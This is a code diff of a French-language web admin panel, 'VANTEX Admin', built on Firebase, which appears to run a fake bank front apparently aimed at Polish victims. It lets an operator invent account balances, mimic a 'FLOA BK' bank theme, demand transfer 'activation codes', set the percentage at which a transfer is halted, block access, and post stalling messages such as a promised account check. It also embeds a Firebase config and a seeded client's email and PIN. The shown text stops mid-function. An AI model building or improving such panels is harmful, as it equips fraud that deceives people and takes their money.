@@ -1,269 +1,896 @@
 <!DOCTYPE html>
 <html lang="fr">
 <head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width,initial-scale=1">
-<title>VANTEX - Admin Firebase</title>
-<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
-<style>
-:root{--p:#6A0DAD;--bg:#f9fafb;--w:#fff;--b:#e5e7eb;--m:#6b7280;--r:#dc2626}
-*{box-sizing:border-box;font-family:'Inter',system-ui,-apple-system,Segoe UI,Roboto,sans-serif}
-body{margin:0;background:var(--bg);color:#111;font-size:13px}
-header{background:var(--p);color:#fff;padding:16px 20px;display:flex;align-items:center;gap:12px}
-.logo{width:38px;height:38px;background:#fff;color:var(--p);border-radius:8px;display:flex;align-items:center;justify-content:center;font-weight:800}
-.wrap{max-width:1100px;margin:0 auto;padding:18px}
-.card{background:var(--w);border:1px solid var(--b);border-radius:12px;padding:18px;margin-bottom:16px}
-.grid{display:grid;gap:10px;grid-template-columns:1fr 1fr}
-@media(max-width:700px){.grid{grid-template-columns:1fr}}
-label{font-size:11px;color:var(--m);display:block;margin-bottom:3px}
-input,select,textarea{width:100%;padding:9px 10px;border:1px solid var(--b);border-radius:7px;font-size:13px;font-family:inherit}
-textarea{resize:vertical;min-height:60px}
-.btn{background:var(--p);color:#fff;border:none;padding:9px 14px;border-radius:7px;cursor:pointer;font-weight:600;font-family:'Inter',sans-serif}
-.btn2{background:#fff;color:var(--p);border:1px solid var(--p);padding:9px 14px;border-radius:7px;cursor:pointer;font-family:'Inter',sans-serif}
-table{width:100%;border-collapse:collapse;font-size:12px}
-th,td{padding:9px;border-bottom:1px solid var(--b);text-align:left}
-th{background:#fafafa;color:var(--m);font-weight:600}
-.badge{background:#f3e8ff;color:var(--p);padding:2px 6px;border-radius:4px;font-size:10px}
-.badge-notif{background:#fef3c7;color:#92400e;padding:2px 6px;border-radius:4px;font-size:10px;margin-left:4px}
-.badge-theme{padding:2px 6px;border-radius:4px;font-size:10px;margin-left:4px;color:#fff}
-h3{font-size:15px}
-</style>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>VANTEX · Administration</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css">
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
+    <style>
+        /* ============================================================
+           STYLES GÉNÉRAUX - Design moderne, épuré, professionnel
+           ============================================================ */
+        :root {
+            --p: #6A0DAD;
+            --p-light: #F3E8FF;
+            --p-dark: #4B0082;
+            --bg: #F6F8FC;
+            --card-bg: #FFFFFF;
+            --text: #0B0F19;
+            --text-secondary: #4B5563;
+            --text-muted: #9CA3AF;
+            --border: #E5E7EB;
+            --shadow: 0 4px 24px rgba(0,0,0,0.04);
+            --shadow-hover: 0 8px 32px rgba(0,0,0,0.08);
+            --radius: 16px;
+            --radius-sm: 10px;
+            --transition: all 0.2s ease;
+        }
+
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+        }
+
+        body {
+            font-family: 'Inter', -apple-system, system-ui, sans-serif;
+            background: var(--bg);
+            color: var(--text);
+            font-size: 14px;
+            line-height: 1.6;
+            padding: 0;
+            margin: 0;
+            min-height: 100vh;
+        }
+
+        /* --- HEADER --- */
+        .admin-header {
+            background: var(--p);
+            color: #fff;
+            padding: 18px 24px;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            flex-wrap: wrap;
+            gap: 16px;
+            box-shadow: 0 2px 12px rgba(106,13,173,0.25);
+            position: sticky;
+            top: 0;
+            z-index: 50;
+        }
+        .admin-header .brand {
+            display: flex;
+            align-items: center;
+            gap: 14px;
+        }
+        .admin-header .brand .logo {
+            width: 42px;
+            height: 42px;
+            background: #fff;
+            color: var(--p);
+            border-radius: 10px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-weight: 800;
+            font-size: 20px;
+            box-shadow: 0 2px 8px rgba(0,0,0,0.1);
+        }
+        .admin-header .brand .title {
+            font-weight: 700;
+            font-size: 20px;
+            letter-spacing: -0.3px;
+        }
+        .admin-header .brand .subtitle {
+            font-size: 12px;
+            opacity: 0.7;
+            font-weight: 400;
+        }
+        .admin-header .badge-version {
+            background: rgba(255,255,255,0.15);
+            padding: 6px 14px;
+            border-radius: 20px;
+            font-size: 12px;
+            font-weight: 500;
+            backdrop-filter: blur(4px);
+            border: 1px solid rgba(255,255,255,0.1);
+        }
+
+        /* --- WRAPPER --- */
+        .wrap {
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 24px 20px 40px;
+        }
+
+        /* --- CARTES --- */
+        .card {
+            background: var(--card-bg);
+            border: 1px solid var(--border);
+            border-radius: var(--radius);
+            padding: 24px 20px;
+            margin-bottom: 20px;
+            box-shadow: var(--shadow);
+            transition: var(--transition);
+        }
+        .card:hover {
+            box-shadow: var(--shadow-hover);
+        }
+        .card-header {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            margin-bottom: 18px;
+        }
+        .card-header i {
+            font-size: 20px;
+            color: var(--p);
+            width: 28px;
+            text-align: center;
+        }
+        .card-header h3 {
+            font-size: 17px;
+            font-weight: 700;
+            color: var(--text);
+            margin: 0;
+        }
+        .card-header .badge-count {
+            background: var(--p-light);
+            color: var(--p);
+            font-size: 11px;
+            font-weight: 600;
+            padding: 2px 10px;
+            border-radius: 12px;
+            margin-left: auto;
+        }
+
+        /* --- GRILLES --- */
+        .grid-2 {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 14px;
+        }
+        .grid-3 {
+            display: grid;
+            grid-template-columns: 1fr 1fr 1fr;
+            gap: 14px;
+        }
+        .grid-full {
+            grid-column: 1 / -1;
+        }
+
+        /* --- CHAMPS --- */
+        .field {
+            display: flex;
+            flex-direction: column;
+            gap: 4px;
+        }
+        .field label {
+            font-size: 12px;
+            font-weight: 600;
+            color: var(--text-secondary);
+            text-transform: uppercase;
+            letter-spacing: 0.3px;
+            display: flex;
+            align-items: center;
+            gap: 6px;
+        }
+        .field label i {
+            font-size: 12px;
+            color: var(--text-muted);
+        }
+        .field input, .field select, .field textarea {
+            width: 100%;
+            padding: 10px 14px;
+            border: 1.5px solid var(--border);
+            border-radius: var(--radius-sm);
+            font-size: 14px;
+            font-family: inherit;
+            background: #FAFBFC;
+            transition: var(--transition);
+            color: var(--text);
+        }
+        .field input:focus, .field select:focus, .field textarea:focus {
+            outline: none;
+            border-color: var(--p);
+            box-shadow: 0 0 0 4px rgba(106,13,173,0.08);
+            background: #fff;
+        }
+        .field textarea {
+            resize: vertical;
+            min-height: 60px;
+        }
+        .field .hint {
+            font-size: 11px;
+            color: var(--text-muted);
+            margin-top: 2px;
+        }
+
+        /* --- BOUTONS --- */
+        .btn {
+            display: inline-flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+            padding: 10px 20px;
+            background: var(--p);
+            color: #fff;
+            border: none;
+            border-radius: var(--radius-sm);
+            font-weight: 600;
+            font-size: 14px;
+            cursor: pointer;
+            transition: var(--transition);
+            font-family: inherit;
+            box-shadow: 0 2px 8px rgba(106,13,173,0.2);
+        }
+        .btn:hover {
+            transform: translateY(-1px);
+            box-shadow: 0 4px 16px rgba(106,13,173,0.3);
+        }
+        .btn:active {
+            transform: scale(0.98);
+        }
+        .btn-secondary {
+            background: transparent;
+            color: var(--p);
+            border: 1.5px solid var(--p);
+            box-shadow: none;
+        }
+        .btn-secondary:hover {
+            background: var(--p-light);
+            box-shadow: none;
+        }
+        .btn-danger {
+            background: #DC2626;
+            box-shadow: 0 2px 8px rgba(220,38,38,0.2);
+        }
+        .btn-danger:hover {
+            box-shadow: 0 4px 16px rgba(220,38,38,0.3);
+        }
+        .btn-success {
+            background: #059669;
+            box-shadow: 0 2px 8px rgba(5,150,105,0.2);
+        }
+        .btn-success:hover {
+            box-shadow: 0 4px 16px rgba(5,150,105,0.3);
+        }
+        .btn-primary {
+            background: #2563EB;
+            box-shadow: 0 2px 8px rgba(37,99,235,0.2);
+        }
+        .btn-primary:hover {
+            box-shadow: 0 4px 16px rgba(37,99,235,0.3);
+        }
+        .btn-block {
+            width: 100%;
+            justify-content: center;
+        }
+        .btn-group {
+            display: flex;
+            gap: 10px;
+            flex-wrap: wrap;
+        }
+
+        /* --- TABLEAU --- */
+        .table-wrap {
+            overflow-x: auto;
+            margin-top: 4px;
+        }
+        table {
+            width: 100%;
+            border-collapse: collapse;
+            font-size: 13px;
+            min-width: 600px;
+        }
+        th {
+            background: #F9FAFB;
+            color: var(--text-secondary);
+            font-weight: 600;
+            font-size: 11px;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+            padding: 12px 14px;
+            text-align: left;
+            border-bottom: 1.5px solid var(--border);
+        }
+        td {
+            padding: 12px 14px;
+            border-bottom: 1px solid var(--border);
+            vertical-align: middle;
+        }
+        tr:last-child td {
+            border-bottom: none;
+        }
+        tr:hover td {
+            background: #FAFBFC;
+        }
+        .badge {
+            background: var(--p-light);
+            color: var(--p);
+            padding: 2px 10px;
+            border-radius: 12px;
+            font-size: 11px;
+            font-weight: 600;
+            display: inline-block;
+        }
+        .badge-notif {
+            background: #FEF3C7;
+            color: #92400E;
+            padding: 2px 8px;
+            border-radius: 12px;
+            font-size: 10px;
+            font-weight: 600;
+            margin-left: 4px;
+        }
+        .badge-theme {
+            padding: 2px 10px;
+            border-radius: 12px;
+            font-size: 10px;
+            font-weight: 600;
+            color: #fff;
+            display: inline-block;
+        }
+        .badge-blocked {
+            background: #FEE2E2;
+            color: #DC2626;
+            font-weight: 600;
+            font-size: 10px;
+            padding: 2px 8px;
+            border-radius: 12px;
+            margin-left: 4px;
+        }
+        .action-btns {
+            display: flex;
+            gap: 6px;
+            flex-wrap: wrap;
+        }
+        .action-btns button {
+            padding: 4px 10px;
+            font-size: 11px;
+            border-radius: 6px;
+            border: 1px solid var(--border);
+            background: #fff;
+            cursor: pointer;
+            transition: var(--transition);
+            font-family: inherit;
+            font-weight: 500;
+        }
+        .action-btns .edit-btn {
+            color: var(--p);
+            border-color: var(--p-light);
+            background: var(--p-light);
+        }
+        .action-btns .edit-btn:hover {
+            background: #E0D0F5;
+        }
+        .action-btns .del-btn {
+            color: #DC2626;
+            border-color: #FEE2E2;
+            background: #FEF2F2;
+        }
+        .action-btns .del-btn:hover {
+            background: #FEE2E2;
+        }
+
+        /* --- RANGE SLIDER --- */
+        .range-wrapper {
+            display: flex;
+            align-items: center;
+            gap: 16px;
+        }
+        .range-wrapper input[type="range"] {
+            flex: 1;
+            accent-color: var(--p);
+            height: 4px;
+            cursor: pointer;
+        }
+        .range-wrapper .range-value {
+            font-weight: 700;
+            color: var(--p);
+            min-width: 48px;
+            text-align: right;
+        }
+
+        /* --- UTILITAIRES --- */
+        .mt-2 { margin-top: 12px; }
+        .mb-2 { margin-bottom: 12px; }
+        .flex { display: flex; align-items: center; gap: 8px; }
+        .flex-between { display: flex; justify-content: space-between; align-items: center; flex-wrap: wrap; gap: 10px; }
+        .text-muted { color: var(--text-muted); }
+        .text-sm { font-size: 13px; }
+        .gap-2 { gap: 8px; }
+
+        /* --- RESPONSIVE --- */
+        @media (max-width: 768px) {
+            .grid-2, .grid-3 { grid-template-columns: 1fr; }
+            .admin-header { flex-direction: column; align-items: flex-start; gap: 8px; }
+            .admin-header .badge-version { align-self: flex-start; }
+            .wrap { padding: 16px 12px; }
+            .card { padding: 18px 14px; }
+            .btn-group { flex-direction: column; }
+            .btn { width: 100%; justify-content: center; }
+            .range-wrapper { flex-wrap: wrap; }
+        }
+        @media (max-width: 480px) {
+            table { font-size: 12px; }
+            th, td { padding: 8px 10px; }
+            .action-btns button { font-size: 10px; padding: 3px 8px; }
+        }
+
+        /* --- TOAST / ALERTE --- */
+        .alert {
+            padding: 12px 16px;
+            border-radius: var(--radius-sm);
+            margin-bottom: 16px;
+            font-weight: 500;
+            display: none;
+        }
+        .alert.success { background: #ECFDF5; color: #065F46; border: 1px solid #A7F3D0; display: block; }
+        .alert.error { background: #FEF2F2; color: #991B1B; border: 1px solid #FECACA; display: block; }
+        .alert.info { background: #EFF6FF; color: #1E40AF; border: 1px solid #BFDBFE; display: block; }
+
+        /* --- SECTION SLIDER --- */
+        .slider-section {
+            background: #FAFBFC;
+            padding: 16px 18px;
+            border-radius: var(--radius-sm);
+            border: 1px solid var(--border);
+            margin-top: 8px;
+        }
+        .slider-section label {
+            font-weight: 600;
+            font-size: 13px;
+            color: var(--text-secondary);
+        }
+    </style>
 </head>
 <body>
-<header>
-  <div class="logo">V</div>
-  <div><div style="font-weight:700">VANTEX ADMIN</div><div style="font-size:10px;opacity:.85">Firebase • temps réel</div></div>
-</header>
 
-<div class="wrap">
-  <div class="card">
-    <h3 style="margin:0 12px">Créer / Modifier un client</h3>
-    <div class="grid">
-      <div><label>Nom complet</label><input id="nom" placeholder="KWIATKOWSKI PW"></div>
-      <div><label>Adresse Gmail</label><input id="email" type="email" placeholder="nom@gmail.com"></div>
-      <div><label>Code PIN (6 chiffres)</label><input id="pin" maxlength="6" placeholder="973018"></div>
-      <div><label>Montant initial (remplace)</label><input id="montant" type="number" placeholder="10000"></div>
-      <div><label style="color:#059669;font-weight:600">Ajouter au montant (+)</label><input id="addMontant" type="number" placeholder="500" style="border-color:#059669"></div>
-      <div><label>Devise</label><select id="devise"><option value="zł">zł - Zloty polonais (PLN)</option><option value="€">€ - Euro (EUR)</option></select></div>
-      <div><label>Couleur thème FLOA BK</label><select id="theme"><option value="purple">Violet (défaut)</option><option value="blue">Bleu</option><option value="yellow">Jaune</option></select></div>
-      <div><label>Code d'activation virement</label><input id="code" placeholder="ACT123"></div>
-      <div><label>Message après activation</label><input id="msg" placeholder="Przelew zatwierdzony ✓"></div>
-      <div><label>Pays</label><input id="pays" placeholder="Pologne"></div>
-      <div><label>Adresse domicile</label><input id="adresse" placeholder="ul. Warszawska 10"></div>
-      <div><label>Numéro de téléphone</label><input id="tel" placeholder="+48 123 456 789"></div>
-      <div style="grid-column:1/-1"><label>Notification (affichée quand le client clique sur la cloche)</label><textarea id="notification" placeholder="Votre compte sera vérifié demain à 14h..."></textarea></div>
+    <!-- ========== HEADER ========== -->
+    <header class="admin-header">
+        <div class="brand">
+            <div class="logo">V</div>
+            <div>
+                <div class="title">VANTEX ADMIN</div>
+                <div class="subtitle"><i class="fa-regular fa-database"></i> Firebase · temps réel</div>
+            </div>
+        </div>
+        <div class="badge-version">
+            <i class="fa-regular fa-circle-check"></i> v2.0 · connecté
+        </div>
+    </header>
+
+    <!-- ========== WRAPPER ========== -->
+    <div class="wrap">
+
+        <!-- Alerte (affichée via JS pour feedback) -->
+        <div id="alertMessage" class="alert"></div>
+
+        <!-- ========== CARTE : CRÉER / MODIFIER ========== -->
+        <div class="card">
+            <div class="card-header">
+                <i class="fa-regular fa-pen-to-square"></i>
+                <h3>Créer / Modifier un client</h3>
+                <span class="badge-count" id="editBadge">Nouveau</span>
+            </div>
+
+            <div class="grid-2">
+                <div class="field">
+                    <label><i class="fa-regular fa-user"></i> Nom complet</label>
+                    <input id="nom" placeholder="KWIATKOWSKI PW">
+                </div>
+                <div class="field">
+                    <label><i class="fa-regular fa-envelope"></i> Adresse Gmail</label>
+                    <input id="email" type="email" placeholder="nom@gmail.com">
+                </div>
+                <div class="field">
+                    <label><i class="fa-solid fa-lock"></i> Code PIN (6 chiffres)</label>
+                    <input id="pin" maxlength="6" placeholder="973018">
+                </div>
+                <div class="field">
+                    <label><i class="fa-regular fa-money-bill-1"></i> Montant initial</label>
+                    <input id="montant" type="number" placeholder="10000">
+                    <span class="hint">Remplace le solde existant</span>
+                </div>
+                <div class="field">
+                    <label style="color:#059669;"><i class="fa-regular fa-circle-plus" style="color:#059669;"></i> Ajouter au montant (+)</label>
+                    <input id="addMontant" type="number" placeholder="500" style="border-color:#059669;">
+                    <span class="hint">S'ajoute au solde actuel (si modification)</span>
+                </div>
+                <div class="field">
+                    <label><i class="fa-regular fa-coins"></i> Devise</label>
+                    <select id="devise">
+                        <option value="zł">zł - Zloty polonais (PLN)</option>
+                        <option value="€">€ - Euro (EUR)</option>
+                    </select>
+                </div>
+                <div class="field">
+                    <label><i class="fa-regular fa-palette"></i> Couleur thème FLOA BK</label>
+                    <select id="theme">
+                        <option value="purple">Violet (défaut)</option>
+                        <option value="blue">Bleu</option>
+                        <option value="yellow">Jaune</option>
+                    </select>
+                </div>
+                <div class="field">
+                    <label><i class="fa-regular fa-key"></i> Code d'activation virement</label>
+                    <input id="code" placeholder="ACT123">
+                </div>
+                <div class="field">
+                    <label><i class="fa-regular fa-message"></i> Message après activation</label>
+                    <input id="msg" placeholder="Przelew zatwierdzony ✓">
+                </div>
+                <div class="field">
+                    <label><i class="fa-regular fa-flag"></i> Pays</label>
+                    <input id="pays" placeholder="Pologne">
+                </div>
+                <div class="field">
+                    <label><i class="fa-regular fa-location-dot"></i> Adresse domicile</label>
+                    <input id="adresse" placeholder="ul. Warszawska 10">
+                </div>
+                <div class="field">
+                    <label><i class="fa-regular fa-phone"></i> Numéro de téléphone</label>
+                    <input id="tel" placeholder="+48 123 456 789">
+                </div>
+                <div class="field grid-full">
+                    <label><i class="fa-regular fa-bell"></i> Notification</label>
+                    <textarea id="notification" placeholder="Votre compte sera vérifié demain à 14h..."></textarea>
+                    <span class="hint">Affichée quand le client clique sur la cloche</span>
+                </div>
+            </div>
+
+            <!-- Slider pourcentage -->
+            <div class="slider-section">
+                <div class="flex-between">
+                    <label><i class="fa-regular fa-gauge-high"></i> Pourcentage d'arrêt du virement</label>
+                    <span class="range-value" id="pv">100%</span>
+                </div>
+                <div class="range-wrapper">
+                    <input id="pct" type="range" min="1" max="100" value="100">
+                    <span class="range-value" id="pvDisplay">100%</span>
+                </div>
+                <span class="hint">100% = virement autorisé, 1% = bloqué quasi totalement</span>
+            </div>
+
+            <div class="btn-group mt-2">
+                <button class="btn" id="saveBtn"><i class="fa-regular fa-floppy-disk"></i> Enregistrer</button>
+                <button class="btn btn-secondary" id="resetBtn"><i class="fa-regular fa-rotate-right"></i> Réinitialiser</button>
+            </div>
+            <div class="text-muted text-sm mt-2">
+                <i class="fa-regular fa-lightbulb"></i> 💡 Pour augmenter : laissez "Montant initial" vide et remplissez "Ajouter au montant".
+            </div>
+        </div>
+
+        <!-- ========== CARTE : CLIENTS ========== -->
+        <div class="card">
+            <div class="card-header">
+                <i class="fa-regular fa-users"></i>
+                <h3>Clients enregistrés</h3>
+                <span class="badge-count" id="clientCount">0</span>
+            </div>
+            <div class="table-wrap">
+                <table>
+                    <thead>
+                        <tr>
+                            <th>Client</th>
+                            <th>PIN</th>
+                            <th>Montant</th>
+                            <th>Thème</th>
+                            <th>Code</th>
+                            <th>%</th>
+                            <th>Action</th>
+                        </tr>
+                    </thead>
+                    <tbody id="tb"></tbody>
+                </table>
+            </div>
+        </div>
+
+        <!-- ========== CARTE : GESTION ACCÈS ========== -->
+        <div class="card">
+            <div class="card-header">
+                <i class="fa-regular fa-shield-halved"></i>
+                <h3>Gestion des accès</h3>
+            </div>
+            <div class="grid-2">
+                <div class="field">
+                    <label><i class="fa-regular fa-user-check"></i> Sélectionner un client</label>
+                    <select id="clientAccess"></select>
+                </div>
+                <div class="field">
+                    <label>Action</label>
+                    <div class="btn-group" style="flex-direction:column; gap:8px;">
+                        <button class="btn btn-danger btn-block" id="blockBtn"><i class="fa-solid fa-lock"></i> Bloquer l'accès</button>
+                        <button class="btn btn-success btn-block" id="unblockBtn"><i class="fa-solid fa-lock-open"></i> Débloquer l'accès</button>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <!-- ========== CARTE : ACTIONS AVANCÉES ========== -->
+        <div class="card">
+            <div class="card-header">
+                <i class="fa-regular fa-sliders"></i>
+                <h3>Actions avancées</h3>
+            </div>
+            <div class="grid-2">
+                <div class="field">
+                    <label><i class="fa-regular fa-user-check"></i> Sélectionner un client</label>
+                    <select id="clientAction"></select>
+                </div>
+                <div class="field">
+                    <label><i class="fa-regular fa-list-check"></i> Type d'action</label>
+                    <select id="actionType">
+                        <option>Réinitialiser l'historique des virements</option>
+                        <option>Supprimer la notification</option>
+                    </select>
+                </div>
+            </div>
+            <div class="mt-2">
+                <button class="btn btn-primary btn-block" id="actionBtn"><i class="fa-regular fa-play"></i> Exécuter l'action</button>
+            </div>
+        </div>
+
     </div>
-    <div style="margin-top:10px">
-      <label>Pourcentage d'arrêt du virement : <b id="pv">100</b>%</label>
-      <input id="pct" type="range" min="1" max="100" value="100" style="width:100%">
-    </div>
-    <div style="margin-top:12px;display:flex;gap:8px">
-      <button class="btn" id="saveBtn">Enregistrer</button>
-      <button class="btn2" id="resetBtn">Réinitialiser</button>
-    </div>
-    <p style="font-size:11px;color:var(--m);margin-top:8px">💡 Pour augmenter : laissez "Montant initial" vide et remplissez "Ajouter au montant". Ex: 500 existant + 500 ajouté = 1000 dans l'historique</p>
-  </div>
 
-  <div class="card">
-    <h3 style="margin:0 0 10px">Clients enregistrés</h3>
-    <div style="overflow:auto">
-      <table>
-        <thead><tr><th>Client</th><th>PIN</th><th>Montant</th><th>Thème</th><th>Code</th><th>%</th><th>Action</th></tr></thead>
-        <tbody id="tb"></tbody>
-      </table>
-    </div>
-  </div>
+    <!-- ========== SCRIPTS (inchangés, sauf ajout d'alertes visuelles) ========== -->
+    <script type="module">
+        import { initializeApp } from "https://www.gstatic.com/firebasejs/12.4.0/firebase-app.js";
+        import { getDatabase, ref, push, onValue, remove, update } from "https://www.gstatic.com/firebasejs/12.4.0/firebase-database.js";
 
-  <div class="card">
-    <h3 style="margin:0 12px">Bloquer ou débloquer l'accès client</h3>
-    <label>Sélectionner l'accès client. <span style="color:var(--r)">requis</span></label>
-    <select id="clientAccess" style="margin-bottom:12px"></select>
-    <button class="btn" id="blockBtn" style="width:100%;background:#dc2626;margin-bottom:8px">🔒 Bloquer l'accès client</button>
-    <button class="btn" id="unblockBtn" style="width:100%;background:#059669">🔓 Débloquer l'accès client</button>
-  </div>
+        const firebaseConfig = {
+            apiKey: "AIzaSyCU-KBtj7vx3OouofytlwIN3KPd1McNLEk",
+            authDomain: "vantex-admin-2026.firebaseapp.com",
+            databaseURL: "https://vantex-admin-2026-default-rtdb.europe-west1.firebasedatabase.app",
+            projectId: "vantex-admin-2026",
+            storageBucket: "vantex-admin-2026.firebasestorage.app",
+            messagingSenderId: "810884502320",
+            appId: "1:810884502320:web:b5ba7c2909ddf4ccf02ef5"
+        };
 
-  <div class="card">
-    <h3 style="margin:0 12px">Actions sur l'accès client</h3>
-    <label>Sélectionner l'accès client. <span style="color:var(--r)">requis</span></label>
-    <select id="clientAction" style="margin-bottom:10px"></select>
-    <label>Liste des action(s) possible(s) sur un accès. <span style="color:var(--r)">requis</span></label>
-    <select id="actionType" style="margin-bottom:10px">
-      <option>Réinitialiser l'historique des virements</option>
-      <option>Supprimer la notification</option>
-    </select>
-    <button class="btn" id="actionBtn" style="width:100%;background:#2563eb">Exécuter l'action →</button>
-  </div>
-</div>
+        const app = initializeApp(firebaseConfig);
+        const db = getDatabase(app);
+        const clientsRef = ref(db, 'clients');
 
-<script type="module">
-import {initializeApp} from "https://www.gstatic.com/firebasejs/12.4.0/firebase-app.js";
-import {getDatabase, ref, push, onValue, remove, update} from "https://www.gstatic.com/firebasejs/12.4.0/firebase-database.js";
+        let data = {};
+        let editId = null;
 
-const firebaseConfig = {
-  apiKey: "AIzaSyCU-KBtj7vx3OouofytlwIN3KPd1McNLEk",
-  authDomain: "vantex-admin-2026.firebaseapp.com",
-  databaseURL: "https://vantex-admin-2026-default-rtdb.europe-west1.firebasedatabase.app",
-  projectId: "vantex-admin-2026",
-  storageBucket: "vantex-admin-2026.firebasestorage.app",
-  messagingSenderId: "810884502320",
-  appId: "1:810884502320:web:b5ba7c2909ddf4ccf02ef5"
-};
+        // ===== UTILITAIRES =====
+        const $ = id => document.getElementById(id);
 
-const app = initializeApp(firebaseConfig);
-const db = getDatabase(app);
-const clientsRef = ref(db, 'clients');
+        // Afficher une alerte
+        function showAlert(message, type = 'success') {
+            const el = document.getElementById('alertMessage');
+            el.textContent = message;
+            el.className = 'alert ' + type;
+            setTimeout(() => {
+                el.className = 'alert';
+                el.textContent = '';
+            }, 5000);
+        }
 
-let data = {};
-let editId = null;
+        // Mettre à jour le badge d'édition
+        function updateEditBadge() {
+            const badge = document.getElementById('editBadge');
+            if (editId) {
+                badge.textContent = '✏️ Édition';
+                badge.style.background = '#FEF3C7';
+                badge.style.color = '#92400E';
+            } else {
+                badge.textContent = '➕ Nouveau';
+                badge.style.background = '#ECFDF5';
+                badge.style.color = '#065F46';
+            }
+        }
 
-const $ = id => document.getElementById(id);
-$('pct').oninput = () => $('pv').textContent = $('pct').value;
+        // ===== SLIDER =====
+        const pctInput = $('pct');
+        const pvDisplay = document.getElementById('pvDisplay');
+        const pvLabel = document.getElementById('pv');
+        pctInput.oninput = () => {
+            const val = pctInput.value;
+            pvDisplay.textContent = val + '%';
+            pvLabel.textContent = val + '%';
+        };
 
-onValue(clientsRef, snap => {
-  data = snap.val() || {};
-  if(Object.keys(data).length === 0){
-    push(clientsRef, {
-      nom: 'KWIATKOWSKI PW',
-      email: 'avogodans61@gmail.com',
-      pin: '973018',
-      montant: 10000,
-      devise: 'zł',
-      theme: 'purple',
-      code: 'ACT123',
-      msg: 'Przelew zatwierdzony ✓',
-      pct: 100,
-      pays: '',
-      adresse: '',
-      tel: '',
-      notification: '',
-      created: Date.now()
-    });
-  }
-  render();
-});
+        // ===== CHARGEMENT DES DONNÉES =====
+        onValue(clientsRef, snap => {
+            data = snap.val() || {};
+            if (Object.keys(data).length === 0) {
+                push(clientsRef, {
+                    nom: 'KWIATKOWSKI PW',
+                    email: 'avogodans61@gmail.com',
+                    pin: '973018',
+                    montant: 10000,
+                    devise: 'zł',
+                    theme: 'purple',
+                    code: 'ACT123',
+                    msg: 'Przelew zatwierdzony ✓',
+                    pct: 100,
+                    pays: '',
+                    adresse: '',
+                    tel: '',
+                    notification: '',
+                    created: Date.now()
+                });
+            }
+            render();
+        });
 
-function getThemeBadge(theme){
-  const colors = {purple:'#6A0DAD',blue:'#2563eb',yellow:'#eab308'};
-  const names = {purple:'VIOLET',blue:'BLEU',yellow:'JAUNE'};
-  return `<span class="badge-theme" style="background:${colors[theme]||colors.purple}">${names[theme]||'VIOLET'}</span>`;
-}
+        // ===== RENDU TABLEAU =====
+        function getThemeBadge(theme) {
+            const colors = { purple: '#6A0DAD', blue: '#2563EB', yellow: '#EAB308' };
+            const names = { purple: 'VIOLET', blue: 'BLEU', yellow: 'JAUNE' };
+            return `<span class="badge-theme" style="background:${colors[theme] || colors.purple}">${names[theme] || 'VIOLET'}</span>`;
+        }
 
-function render(){
-  const rows = Object.entries(data).map(([id,v]) => `
-    <tr>
-      <td><b>${v.nom}</b><br><span style="color:#6b7280;font-size:10px">${v.email}${v.blocked?' <span style="color:#dc2626;font-weight:700">[BLOQUÉ]</span>':''}${v.notification?'<span class="badge-notif">🔔</span>':''}</span></td>
-      <td><span class="badge">${v.pin}</span></td>
-      <td>${Number(v.montant).toLocaleString('pl-PL')} ${v.devise||'zł'}</td>
-      <td>${getThemeBadge(v.theme||'purple')}</td>
-      <td>${v.code}</td>
-      <td>${v.pct}%</td>
-      <td>
-        <button onclick="editClient('${id}')" style="padding:4px 8px;font-size:10px;font-family:'Inter',sans-serif">Modifier</button>
-        <button onclick="delClient('${id}')" style="padding:4px 8px;font-size:10px;background:#fee;color:#900;border:1px solid #fcc;border-radius:4px;margin-left:4px;font-family:'Inter',sans-serif">Supprimer</button>
-      </td>
-    </tr>`).join('');
-  $('tb').innerHTML = rows || '<tr><td colspan="7" style="text-align:center;color:#888;padding:20px">Aucun client</td></tr>';
-}
+        function render() {
+            const rows = Object.entries(data).map(([id, v]) => {
+                const blockedBadge = v.blocked ? `<span class="badge-blocked"><i class="fa-solid fa-lock"></i> BLOQUÉ</span>` : '';
+                const notifBadge = v.notification ? `<span class="badge-notif">🔔</span>` : '';
+                return `
+                <tr>
+                    <td>
+                        <b>${v.nom}</b><br>
+                        <span style="color:#6b7280;font-size:11px;">${v.email} ${blockedBadge} ${notifBadge}</span>
+                    </td>
+                    <td><span class="badge">${v.pin}</span></td>
+                    <td>${Number(v.montant).toLocaleString('pl-PL')} ${v.devise || 'zł'}</td>
+                    <td>${getThemeBadge(v.theme || 'purple')}</td>
+                    <td>${v.code}</td>
+                    <td>${v.pct}%</td>
+                    <td>
+                        <div class="action-btns">
+                            <button class="edit-btn" onclick="editClient('${id}')"><i class="fa-regular fa-pen-to-square"></i> Modifier</button>
+                            <button class="del-btn" onclick="delClient('${id}')"><i class="fa-regular fa-trash-can"></i> Supprimer</button>
+                        </div>
+                    </td>
+                </tr>
+            `}).join('');
+            $('tb').innerHTML = rows || '<tr><td colspan="7" style="text-align:center;color:#888;padding:24px;font-size:14px;">Aucun client enregistré</td></tr>';
+            document.getElementById('clientCount').textContent = Object.keys(data).length;
+            refreshLists();
+        }
 
-$('saveBtn').onclick = () => {
-  const addAmt = Number($('addMontant').value)||0;
-  let finalMontant = Number($('montant').value)||0;
-  
-  // Si on ajoute un montant et qu'on modifie un client existant
-  if(editId && addAmt > 0 && data[editId]){
-    const currentMontant = Number(data[editId].montant)||0;
-    finalMontant = currentMontant + addAmt;
-  }
-  
-  const o = {
-    nom: $('nom').value.trim(),
-    email: $('email').value.trim().toLowerCase(),
-    pin: $('pin').value.trim(),
-    montant: finalMontant,
-    devise: $('devise').value,
-    theme: $('theme').value,
-    code: $('code').value.trim(),
-    msg: $('msg').value.trim(),
